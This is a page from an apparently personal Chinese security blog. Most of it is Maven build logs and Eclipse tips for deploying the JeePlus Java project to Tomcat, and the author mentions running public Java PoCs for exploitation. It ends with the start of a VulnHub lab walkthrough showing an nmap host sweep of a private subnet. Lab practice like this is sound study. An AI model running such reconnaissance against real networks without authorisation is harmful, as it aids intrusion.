<p>紧接着输入<code class="language-plaintext highlighter-rouge">mvn clean package</code>命令；</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS G:<span class="se">\y</span>j-work<span class="se">\j</span>ava-code<span class="se">\j</span>eeplus-open&gt; mvn clean package
<span class="o">[</span>INFO] Scanning <span class="k">for </span>projects...
<span class="o">[</span>WARNING]
<span class="o">[</span>WARNING] Some problems were encountered <span class="k">while </span>building the effective model <span class="k">for </span>jeeplus:jeeplus:war:1.0.0-SNAPSHOT
<span class="o">[</span>WARNING] <span class="s1">'dependencies.dependency.(groupId:artifactId:type:classifier)'</span> must be unique: javax.servlet.jsp:jsp-api:jar -&gt; version 2.1 vs 2.2 @ line 278, column 21
<span class="o">[</span>WARNING]
<span class="o">[</span>WARNING] It is highly recommended to fix these problems because they threaten the stability of your build.
<span class="o">[</span>WARNING]
<span class="o">[</span>WARNING] For this reason, future Maven versions might no longer support building such malformed projects.
<span class="o">[</span>WARNING]
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">--------------------------</span>&lt; jeeplus:jeeplus <span class="o">&gt;</span><span class="nt">---------------------------</span>
<span class="o">[</span>INFO] Building jeeplusx 1.0.0-SNAPSHOT
<span class="o">[</span>INFO] <span class="nt">--------------------------------</span><span class="o">[</span> war <span class="o">]</span><span class="nt">---------------------------------</span>
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-clean-plugin:2.5:clean <span class="o">(</span>default-clean<span class="o">)</span> @ jeeplus <span class="nt">---</span>
<span class="o">[</span>INFO] Deleting G:<span class="se">\y</span>j-work<span class="se">\j</span>ava-code<span class="se">\j</span>eeplus-open<span class="se">\t</span>arget
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-resources-plugin:2.6:resources <span class="o">(</span>default-resources<span class="o">)</span> @ jeeplus <span class="nt">---</span>
<span class="o">[</span>INFO] Using <span class="s1">'UTF-8'</span> encoding to copy filtered resources.
<span class="o">[</span>INFO] Copying 65 resources
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-compiler-plugin:3.3:compile <span class="o">(</span>default-compile<span class="o">)</span> @ jeeplus <span class="nt">---</span>
<span class="o">[</span>INFO] Changes detected - recompiling the module!
<span class="o">[</span>INFO] Compiling 258 <span class="nb">source </span>files to G:<span class="se">\y</span>j-work<span class="se">\j</span>ava-code<span class="se">\j</span>eeplus-open<span class="se">\t</span>arget<span class="se">\c</span>lasses
<span class="o">[</span>INFO] /G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/modules/tools/utils/HttpPostTest.java: 某些输入文件使用或覆盖了已过时的 API。
<span class="o">[</span>INFO] /G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/modules/tools/utils/HttpPostTest.java: 有关详细信息, 请使用 <span class="nt">-Xlint</span>:deprecation 重新编译。
<span class="o">[</span>INFO] /G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/common/json/AjaxJson.java: 某些输入文件使用了未经检查或不安全的操作。
<span class="o">[</span>INFO] /G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/common/json/AjaxJson.java: 有关详细信息, 请使用 <span class="nt">-Xlint</span>:unchecked 重新编译。
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-resources-plugin:2.6:testResources <span class="o">(</span>default-testResources<span class="o">)</span> @ jeeplus <span class="nt">---</span>
<span class="o">[</span>INFO] Using <span class="s1">'UTF-8'</span> encoding to copy filtered resources.
<span class="o">[</span>INFO] skip non existing resourceDirectory G:<span class="se">\y</span>j-work<span class="se">\j</span>ava-code<span class="se">\j</span>eeplus-open<span class="se">\s</span>rc<span class="se">\t</span>est<span class="se">\r</span>esources
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-compiler-plugin:3.3:testCompile <span class="o">(</span>default-testCompile<span class="o">)</span> @ jeeplus <span class="nt">---</span>
<span class="o">[</span>INFO] No sources to compile
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-surefire-plugin:2.12.4:test <span class="o">(</span>default-test<span class="o">)</span> @ jeeplus <span class="nt">---</span>
<span class="o">[</span>INFO] No tests to run.
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-war-plugin:2.2:war <span class="o">(</span>default-war<span class="o">)</span> @ jeeplus <span class="nt">---</span>
<span class="o">[</span>INFO] Packaging webapp
<span class="o">[</span>INFO] Assembling webapp <span class="o">[</span>jeeplus] <span class="k">in</span> <span class="o">[</span>G:<span class="se">\y</span>j-work<span class="se">\j</span>ava-code<span class="se">\j</span>eeplus-open<span class="se">\t</span>arget<span class="se">\j</span>eeplus]
<span class="o">[</span>INFO] Processing war project
<span class="o">[</span>INFO] Copying webapp resources <span class="o">[</span>G:<span class="se">\y</span>j-work<span class="se">\j</span>ava-code<span class="se">\j</span>eeplus-open<span class="se">\s</span>rc<span class="se">\m</span>ain<span class="se">\w</span>ebapp]
<span class="o">[</span>INFO] Webapp assembled <span class="k">in</span> <span class="o">[</span>19918 msecs]
<span class="o">[</span>INFO] Building war: G:<span class="se">\y</span>j-work<span class="se">\j</span>ava-code<span class="se">\j</span>eeplus-open<span class="se">\t</span>arget<span class="se">\j</span>eeplus.war
<span class="o">[</span>INFO] WEB-INF<span class="se">\w</span>eb.xml already added, skipping
<span class="o">[</span>INFO] <span class="nt">------------------------------------------------------------------------</span>
<span class="o">[</span>INFO] BUILD SUCCESS
<span class="o">[</span>INFO] <span class="nt">------------------------------------------------------------------------</span>
<span class="o">[</span>INFO] Total <span class="nb">time</span>:  38.071 s
<span class="o">[</span>INFO] Finished at: 2020-01-19T16:49:31+08:00
<span class="o">[</span>INFO] <span class="nt">------------------------------------------------------------------------</span>
</code></pre></div></div>
<p>连着<code class="language-plaintext highlighter-rouge">build success</code>！可真是令人激动；我们可以看到maven已经构建好了tomcat部署所需要的war包：<code class="language-plaintext highlighter-rouge">[INFO] Building war: G:\yj-work\java-code\jeeplus-open\target\jeeplus.war</code>，直接去对应的绝对路径，把war包<code class="language-plaintext highlighter-rouge">ctrl+c</code>到tomcat的<code class="language-plaintext highlighter-rouge">webapp</code>文件夹里就好了。<br /></p>

<p>至此部署完毕，对项目查看一下，是否已经部署成功。</p>

<h3 id="验证部署">验证部署</h3>
<p>多说无益，上代码：<br />
进入tomcat/bin/目录，启动tomcat</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS E:<span class="se">\j</span>ava<span class="se">\t</span>omcat<span class="se">\a</span>pache-tomcat-8.5.50<span class="se">\b</span><span class="k">in</span><span class="o">&gt;</span> .<span class="se">\s</span>tartup.bat
Using CATALINA_BASE:   <span class="s2">"E:</span><span class="se">\j</span><span class="s2">ava</span><span class="se">\t</span><span class="s2">omcat</span><span class="se">\a</span><span class="s2">pache-tomcat-8.5.50"</span>
Using CATALINA_HOME:   <span class="s2">"E:</span><span class="se">\j</span><span class="s2">ava</span><span class="se">\t</span><span class="s2">omcat</span><span class="se">\a</span><span class="s2">pache-tomcat-8.5.50"</span>
Using CATALINA_TMPDIR: <span class="s2">"E:</span><span class="se">\j</span><span class="s2">ava</span><span class="se">\t</span><span class="s2">omcat</span><span class="se">\a</span><span class="s2">pache-tomcat-8.5.50</span><span class="se">\t</span><span class="s2">emp"</span>
Using JRE_HOME:        <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files</span><span class="se">\J</span><span class="s2">ava</span><span class="se">\j</span><span class="s2">dk1.8.0_231</span><span class="se">\j</span><span class="s2">re"</span>
Using CLASSPATH:       <span class="s2">"E:</span><span class="se">\j</span><span class="s2">ava</span><span class="se">\t</span><span class="s2">omcat</span><span class="se">\a</span><span class="s2">pache-tomcat-8.5.50</span><span class="se">\b</span><span class="s2">in</span><span class="se">\b</span><span class="s2">ootstrap.jar;E:</span><span class="se">\j</span><span class="s2">ava</span><span class="se">\t</span><span class="s2">omcat</span><span class="se">\a</span><span class="s2">pache-tomcat-8.5.50</span><span class="se">\b</span><span class="s2">in</span><span class="se">\t</span><span class="s2">omcat-juli.jar"</span>
</code></pre></div></div>
<p>验证是否部署成功：
<code class="language-plaintext highlighter-rouge">curl localhost/jeeplus</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS E:<span class="se">\j</span>ava<span class="se">\t</span>omcat<span class="se">\a</span>pache-tomcat-8.5.50<span class="se">\b</span><span class="k">in</span><span class="o">&gt;</span> curl localhost/jeeplus

StatusCode        : 200
StatusDescription :
Content           :

                    &lt;<span class="o">!</span>DOCTYPE html&gt;
                    &lt;html&gt;

                        &lt;<span class="nb">head</span><span class="o">&gt;</span>
                                &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"description"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"User login page"</span> /&gt;
                                &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1.0"</span> /&gt;
                                &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"/jeeplus...
RawContent        : HTTP/1.1 200
                    Content-Language: zh-CN
                    Content-Length: 19162
                    Content-Type: text/html;charset=UTF-8
                    Date: Sun, 19 Jan 2020 09:23:26 GMT

ParsedHtml        : mshtml.HTMLDocumentClass
RawContentLength  : 19162
</span></code></pre></div></div>
<p>如上，部署成功。返回状态值200。<br /></p>

<p>以上。</p>

<hr />

<h3 id="其他">其他</h3>
<p>上面是Maven创建一个标准化的Java项目，举例：即部署一个maven的项目，我们可以通过上面的方式来进行。更多时候，对于我来说，我高频率使用maven是在对于漏洞的验证和利用阶段，即网上公开的<code class="language-plaintext highlighter-rouge">java poc</code>代码诸如此类，显而易见我更倾向于使用java的poc代码而非python代码，由于python语言本身的优势，纵观网上很多<code class="language-plaintext highlighter-rouge">python poc</code>在我看来，对于我们理解漏洞原理本身无实际意义，我并不是说python的poc代码不好，而是这门语言太便利了以至于我们可以很方便去复现一个漏洞，这样会导致人们尤其是刚入门的小白很少去思考甚至不思考。</p>

<p>废话不多说，回到本小结上来：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>E:<span class="se">\j</span>ava<span class="se">\h</span>adoop&gt; mvn archetype:generate <span class="nt">-D</span> <span class="nv">archetypeGroupId</span><span class="o">=</span>org.apache.maven.archetypes <span class="nt">-D</span> <span class="nv">groupId</span><span class="o">=</span>org.conan.myhadoop.mr <span class="nt">-D</span> <span class="nv">artifactId</span><span class="o">=</span>myHadoop <span class="nt">-D</span> <span class="nv">packageName</span><span class="o">=</span>org.conan.myhadoop.mr <span class="nt">-D</span> <span class="nv">version</span><span class="o">=</span>1.0-SNAPSHOT <span class="nt">-D</span> <span class="nv">interactiveMode</span><span class="o">=</span><span class="nb">false
</span>回显如下：
<span class="o">[</span>INFO] Scanning <span class="k">for </span>projects...
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">------------------</span>&lt; org.apache.maven:standalone-pom <span class="o">&gt;</span><span class="nt">-------------------</span>
<span class="o">[</span>INFO] Building Maven Stub Project <span class="o">(</span>No POM<span class="o">)</span> 1
<span class="o">[</span>INFO] <span class="nt">--------------------------------</span><span class="o">[</span> pom <span class="o">]</span><span class="nt">---------------------------------</span>
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="o">&gt;&gt;&gt;</span> maven-archetype-plugin:3.1.2:generate <span class="o">(</span>default-cli<span class="o">)</span> <span class="o">&gt;</span> generate-sources @ standalone-pom <span class="o">&gt;&gt;&gt;</span>
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="o">&lt;&lt;&lt;</span> maven-archetype-plugin:3.1.2:generate <span class="o">(</span>default-cli<span class="o">)</span> &lt; generate-sources @ standalone-pom <span class="o">&lt;&lt;&lt;</span>
<span class="o">[</span>INFO]
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-archetype-plugin:3.1.2:generate <span class="o">(</span>default-cli<span class="o">)</span> @ standalone-pom <span class="nt">---</span>
<span class="o">[</span>INFO] Generating project <span class="k">in </span>Batch mode
<span class="o">[</span>WARNING] No archetype found <span class="k">in </span>remote catalog. Defaulting to internal catalog
<span class="o">[</span>INFO] No archetype defined. Using maven-archetype-quickstart <span class="o">(</span>org.apache.maven.archetypes:maven-archetype-quickstart:1.0<span class="o">)</span>
<span class="o">[</span>INFO] <span class="nt">----------------------------------------------------------------------------</span>
<span class="o">[</span>INFO] Using following parameters <span class="k">for </span>creating project from Old <span class="o">(</span>1.x<span class="o">)</span> Archetype: maven-archetype-quickstart:1.0
<span class="o">[</span>INFO] <span class="nt">----------------------------------------------------------------------------</span>
<span class="o">[</span>INFO] Parameter: basedir, Value: E:<span class="se">\j</span>ava<span class="se">\h</span>adoop
<span class="o">[</span>INFO] Parameter: package, Value: org.conan.myhadoop.mr
<span class="o">[</span>INFO] Parameter: groupId, Value: org.conan.myhadoop.mr
<span class="o">[</span>INFO] Parameter: artifactId, Value: myHadoop
<span class="o">[</span>INFO] Parameter: packageName, Value: org.conan.myhadoop.mr
<span class="o">[</span>INFO] Parameter: version, Value: 1.0-SNAPSHOT
<span class="o">[</span>INFO] project created from Old <span class="o">(</span>1.x<span class="o">)</span> Archetype <span class="k">in </span><span class="nb">dir</span>: E:<span class="se">\j</span>ava<span class="se">\h</span>adoop<span class="se">\m</span>yHadoop
<span class="o">[</span>INFO] <span class="nt">------------------------------------------------------------------------</span>
<span class="o">[</span>INFO] BUILD SUCCESS
<span class="o">[</span>INFO] <span class="nt">------------------------------------------------------------------------</span>
<span class="o">[</span>INFO] Total <span class="nb">time</span>:  3.491 s
<span class="o">[</span>INFO] Finished at: 2020-02-13T14:35:21+08:00
<span class="o">[</span>INFO] <span class="nt">------------------------------------------------------------------------</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS E:<span class="se">\j</span>ava<span class="se">\h</span>adoop&gt; <span class="nb">cd</span> .<span class="se">\m</span>yHadoop<span class="se">\</span>
PS E:<span class="se">\j</span>ava<span class="se">\h</span>adoop<span class="se">\m</span>yHadoop&gt; mvn clean <span class="nb">install</span>
<span class="o">[</span>INFO] Scanning <span class="k">for </span>projects...
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">-------------------</span>&lt; org.conan.myhadoop.mr:myHadoop <span class="o">&gt;</span><span class="nt">-------------------</span>
<span class="o">[</span>INFO] Building myHadoop 1.0-SNAPSHOT
<span class="o">[</span>INFO] <span class="nt">--------------------------------</span><span class="o">[</span> jar <span class="o">]</span><span class="nt">---------------------------------</span>
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-clean-plugin:2.5:clean <span class="o">(</span>default-clean<span class="o">)</span> @ myHadoop <span class="nt">---</span>
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-resources-plugin:2.6:resources <span class="o">(</span>default-resources<span class="o">)</span> @ myHadoop <span class="nt">---</span>
<span class="o">[</span>WARNING] Using platform encoding <span class="o">(</span>GBK actually<span class="o">)</span> to copy filtered resources, i.e. build is platform dependent!
<span class="o">[</span>INFO] skip non existing resourceDirectory E:<span class="se">\j</span>ava<span class="se">\h</span>adoop<span class="se">\m</span>yHadoop<span class="se">\s</span>rc<span class="se">\m</span>ain<span class="se">\r</span>esources
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-compiler-plugin:3.1:compile <span class="o">(</span>default-compile<span class="o">)</span> @ myHadoop <span class="nt">---</span>
<span class="o">[</span>INFO] Changes detected - recompiling the module!
<span class="o">[</span>WARNING] File encoding has not been <span class="nb">set</span>, using platform encoding GBK, i.e. build is platform dependent!
<span class="o">[</span>INFO] Compiling 1 <span class="nb">source </span>file to E:<span class="se">\j</span>ava<span class="se">\h</span>adoop<span class="se">\m</span>yHadoop<span class="se">\t</span>arget<span class="se">\c</span>lasses
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-resources-plugin:2.6:testResources <span class="o">(</span>default-testResources<span class="o">)</span> @ myHadoop <span class="nt">---</span>
<span class="o">[</span>WARNING] Using platform encoding <span class="o">(</span>GBK actually<span class="o">)</span> to copy filtered resources, i.e. build is platform dependent!
<span class="o">[</span>INFO] skip non existing resourceDirectory E:<span class="se">\j</span>ava<span class="se">\h</span>adoop<span class="se">\m</span>yHadoop<span class="se">\s</span>rc<span class="se">\t</span>est<span class="se">\r</span>esources
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-compiler-plugin:3.1:testCompile <span class="o">(</span>default-testCompile<span class="o">)</span> @ myHadoop <span class="nt">---</span>
<span class="o">[</span>INFO] Changes detected - recompiling the module!
<span class="o">[</span>WARNING] File encoding has not been <span class="nb">set</span>, using platform encoding GBK, i.e. build is platform dependent!
<span class="o">[</span>INFO] Compiling 1 <span class="nb">source </span>file to E:<span class="se">\j</span>ava<span class="se">\h</span>adoop<span class="se">\m</span>yHadoop<span class="se">\t</span>arget<span class="se">\t</span>est-classes
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-surefire-plugin:2.12.4:test <span class="o">(</span>default-test<span class="o">)</span> @ myHadoop <span class="nt">---</span>
<span class="o">[</span>INFO] Surefire report directory: E:<span class="se">\j</span>ava<span class="se">\h</span>adoop<span class="se">\m</span>yHadoop<span class="se">\t</span>arget<span class="se">\s</span>urefire-reports
Downloading from alimaven: http://maven.aliyun.com/nexus/content/groups/public/org/apache/maven/surefire/surefire-junit3/2.12.4/surefire-junit3-2.12.4.pom
Downloaded from alimaven: http://maven.aliyun.com/nexus/content/groups/public/org/apache/maven/surefire/surefire-junit3/2.12.4/surefire-junit3-2.12.4.pom <span class="o">(</span>1.7 kB at 2.0 kB/s<span class="o">)</span>
Downloading from alimaven: http://maven.aliyun.com/nexus/content/groups/public/org/apache/maven/surefire/surefire-providers/2.12.4/surefire-providers-2.12.4.pom
Downloaded from alimaven: http://maven.aliyun.com/nexus/content/groups/public/org/apache/maven/surefire/surefire-providers/2.12.4/surefire-providers-2.12.4.pom <span class="o">(</span>2.3 kB at 7.4 kB/s<span class="o">)</span>
Downloading from alimaven: http://maven.aliyun.com/nexus/content/groups/public/org/apache/maven/surefire/surefire-junit3/2.12.4/surefire-junit3-2.12.4.jar
Downloaded from alimaven: http://maven.aliyun.com/nexus/content/groups/public/org/apache/maven/surefire/surefire-junit3/2.12.4/surefire-junit3-2.12.4.jar <span class="o">(</span>26 kB at 60 kB/s<span class="o">)</span>

<span class="nt">-------------------------------------------------------</span>
 T E S T S
<span class="nt">-------------------------------------------------------</span>
Running org.conan.myhadoop.mr.AppTest
Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.02 sec

Results :

Tests run: 1, Failures: 0, Errors: 0, Skipped: 0

<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-jar-plugin:2.4:jar <span class="o">(</span>default-jar<span class="o">)</span> @ myHadoop <span class="nt">---</span>
<span class="o">[</span>INFO] Building jar: E:<span class="se">\j</span>ava<span class="se">\h</span>adoop<span class="se">\m</span>yHadoop<span class="se">\t</span>arget<span class="se">\m</span>yHadoop-1.0-SNAPSHOT.jar
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-install-plugin:2.4:install <span class="o">(</span>default-install<span class="o">)</span> @ myHadoop <span class="nt">---</span>
<span class="o">[</span>INFO] Installing E:<span class="se">\j</span>ava<span class="se">\h</span>adoop<span class="se">\m</span>yHadoop<span class="se">\t</span>arget<span class="se">\m</span>yHadoop-1.0-SNAPSHOT.jar to D:<span class="se">\W</span>orkspace<span class="se">\.</span>m2<span class="se">\r</span>epository<span class="se">\o</span>rg<span class="se">\c</span>onan<span class="se">\m</span>yhadoop<span class="se">\m</span>r<span class="se">\m</span>yHadoop<span class="se">\1</span>.0-SNAPSHOT<span class="se">\m</span>yHadoop-1.0-SNAPSHOT.jar
<span class="o">[</span>INFO] Installing E:<span class="se">\j</span>ava<span class="se">\h</span>adoop<span class="se">\m</span>yHadoop<span class="se">\p</span>om.xml to D:<span class="se">\W</span>orkspace<span class="se">\.</span>m2<span class="se">\r</span>epository<span class="se">\o</span>rg<span class="se">\c</span>onan<span class="se">\m</span>yhadoop<span class="se">\m</span>r<span class="se">\m</span>yHadoop<span class="se">\1</span>.0-SNAPSHOT<span class="se">\m</span>yHadoop-1.0-SNAPSHOT.pom
<span class="o">[</span>INFO] <span class="nt">------------------------------------------------------------------------</span>
<span class="o">[</span>INFO] BUILD SUCCESS
<span class="o">[</span>INFO] <span class="nt">------------------------------------------------------------------------</span>
<span class="o">[</span>INFO] Total <span class="nb">time</span>:  6.062 s
<span class="o">[</span>INFO] Finished at: 2020-02-13T14:36:02+08:00
<span class="o">[</span>INFO] <span class="nt">------------------------------------------------------------------------</span>
</code></pre></div></div>

          <p><a href="/blog/2020/maven/build/mavaProject/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/maven/build/mavaProject/"><h3 class="ctitle">「搬运工笔记」:Maven构建Java web项目</h3></a>
          <p><csmall>Jan 9, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <ul>
  <li>
    <p>Maven构建、Gradle构建最近搞得我头痛，天天搬运别人的东西，搬也搬不像。。问题还没有彻底解决，先随手记下。</p>
  </li>
  <li>
    <table>
      <tbody>
        <tr>
          <td>持续更新中</td>
          <td>updating</td>
          <td>2020/01/21以更新</td>
        </tr>
      </tbody>
    </table>
  </li>
</ul>

<p>师傅最近让我看freebuf上一篇关于jeeplus代码审计的文章，文章讲的是不错的，自己找了个项目来做，之前没有java开发的基础，所以两眼一抹黑，浪费了不少时间，随笔记。</p>

<p><a href="https://github.com/MSOpenTech/redis/releases/download/win-3.2.100/Redis-x64-3.2.100.msi">Redis-x64-3.2.100.msi</a></p>

<h1 id="现象描述">现象描述</h1>
<h2 id="404">404</h2>
<p>eclipse导入jeeplus项目后，用Maven构建，tomcat部署成功未报错，总是访问不了项目，一直404。
搜索CSDN原答案：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>解决如下选中“项目<span class="s2">"，然后右击选择“properties”Deployment，
然后将webContent项remove掉，还有test相关的文件也可以remove掉，
test是测试相关的文件，add一个folder文件，next-&gt;next-&gt;src下的main下
的webapp文件，最后击“Finish”，在add一个Java Build Path Entries，next-&gt;Maven Dependencies
文件，最后再点击"</span>Finish<span class="s2">"；最后再点击"</span>OK<span class="s2">";
重新启动tomcat，在浏览器中输入相应的地址：http://localhost:8080/MavenTest/index.jsp ，进行测试web项目是否创建成功。
</span></code></pre></div></div>
<h2 id="jar-not-found">jar not found</h2>
<p>tomcat 没有jar问题</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>如果你是maven项目，tomcat在发布项目的时候没有同时发布maven依赖所添加的jar包，
你需要设置一下eclipse：
项目 -&gt; 属性 -&gt; Deployment Assembly -&gt; Add -&gt; Java Build Path Entries -&gt; 选择Maven Dependencies -&gt; Finish -&gt; OK
把对应的Maven依赖包也发布到tomcat，调试时会自动把那些jar发布到指定目录下，tomcat也能找到那些jar了。

</code></pre></div></div>

<p>结合eclipse</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mvn eclipse:clean
mvn eclipse:eclipse
<span class="c">##普通Eclipse项目执行 ： </span>
mvn eclipse:eclipse Eclipse
<span class="c">##web项目执行 ： </span>
mvn eclipse:eclipse –Dwtpversion<span class="o">=</span>1.0 
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">--------------------------------------------------</span>华丽的分割线--------------------------------------------------
</code></pre></div></div>

<h1 id="-更新">「 更新」</h1>

<h3 id="2020年01月21日112226maven构建">「2020年01月21日11:22:26」:Maven构建</h3>

<p>小弟之前java学的贼烂，更别说高端的<code class="language-plaintext highlighter-rouge">「Maven」构建</code>了，研究了将近一个星期，终于使用Maven构建起第一个Java web项目，按耐不住内心的激动心情，记录下<br /></p>

<p><a href="/blog/2020/maven/build/mavaProject/">Maven-Build-Jeeplus记录</a></p>

          <p><a href="/blog/2020/maven/build/mavaProject/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/vulnhub-me-and-myGirlfriend/"><h3 class="ctitle">「渗透」：vulnhub-me-and-myGirlfriend</h3></a>
          <p><csmall>Jan 8, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <ul>
  <li>vulnhub走一波～</li>
</ul>

<h1 id="嗅探靶机">嗅探靶机</h1>

<h2 id="nmap开路">nmap开路</h2>
<p>查看一下靶机ip是多少</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">bin4xin</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlist</span><span class="err">#</span> <span class="nx">nmap</span> <span class="o">-</span><span class="nx">sP</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">3.0</span><span class="o">/</span><span class="mi">24</span>

<span class="nx">Starting</span> <span class="nx">Nmap</span> <span class="mf">7.60</span> <span class="p">(</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org ) at 2020-01-08 10:06 UTC</span>
<span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="nx">_gateway</span> <span class="p">(</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">3.1</span><span class="p">)</span>
<span class="nx">Host</span> <span class="nx">is</span> <span class="nx">up</span> <span class="p">(</span><span class="mf">0.0018</span><span class="nx">s</span> <span class="nx">latency</span><span class="p">).</span>
<span class="nx">MAC</span> <span class="nx">Address</span><span class="p">:</span> <span class="mi">24</span><span class="p">:</span><span class="nx">DA</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">2</span><span class="nx">A</span><span class="p">:</span><span class="mi">53</span><span class="p">:</span><span class="mi">84</span> <span class="p">(</span><span class="nx">Unknown</span><span class="p">)</span>
<span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">3.3</span>
<span class="nx">Host</span> <span class="nx">is</span> <span class="nx">up</span> <span class="p">(</span><span class="mf">0.0023</span><span class="nx">s</span> <span class="nx">latency</span><span class="p">).</span>
<span class="nx">MAC</span> <span class="nx">Address</span><span class="p">:</span> <span class="mi">6</span><span class="nx">C</span><span class="p">:</span><span class="mi">4</span><span class="nx">B</span><span class="p">:</span><span class="mi">90</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">8</span><span class="nx">A</span><span class="p">:</span><span class="nx">CC</span> <span class="p">(</span><span class="nx">LiteON</span><span class="p">)</span>
<span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">3.11</span>
<span class="nx">Host</span> <span class="nx">is</span> <span class="nx">up</span> <span class="p">(</span><span class="mf">0.010</span><span class="nx">s</span> <span class="nx">latency</span><span class="p">).</span>
<span class="nx">MAC</span> <span class="nx">Address</span><span class="p">:</span> <span class="mi">1</span><span class="nx">A</span><span class="p">:</span><span class="nx">DF</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">4</span><span class="nx">B</span><span class="p">:</span><span class="mi">9</span><span class="nx">D</span><span class="p">:</span><span class="mi">05</span> <span class="p">(</span><span class="nx">Unknown</span><span class="p">)</span>
<span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">3.14</span>
<span class="nx">Host</span> <span class="nx">is</span> <span class="nx">up</span> <span class="p">(</span><span class="mf">0.049</span><span class="nx">s</span> <span class="nx">latency</span><span class="p">).</span>
<span class="nx">MAC</span> <span class="nx">Address</span><span class="p">:</span> <span class="nx">F4</span><span class="p">:</span><span class="mi">63</span><span class="p">:</span><span class="mi">1</span><span class="nx">F</span><span class="p">:</span><span class="nx">BF</span><span class="p">:</span><span class="mi">96</span><span class="p">:</span><span class="nx">DB</span> <span class="p">(</span><span class="nx">Unknown</span><span class="p">)</span>
<span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">3.17</span>
<span class="nx">Host</span> <span class="nx">is</span> <span class="nx">up</span> <span class="p">(</span><span class="mf">0.010</span><span class="nx">s</span> <span class="nx">latency</span><span class="p">).</span>
<span class="nx">MAC</span> <span class="nx">Address</span><span class="p">:</span> <span class="mi">2</span><span class="nx">C</span><span class="p">:</span><span class="mi">6</span><span class="nx">F</span><span class="p">:</span><span class="nx">C9</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">7</span><span class="nx">B</span><span class="p">:</span><span class="mi">42</span> <span class="p">(</span><span class="nx">Hon</span> <span class="nx">Hai</span> <span class="nx">Precision</span> <span class="nx">Ind</span><span class="p">.)</span>
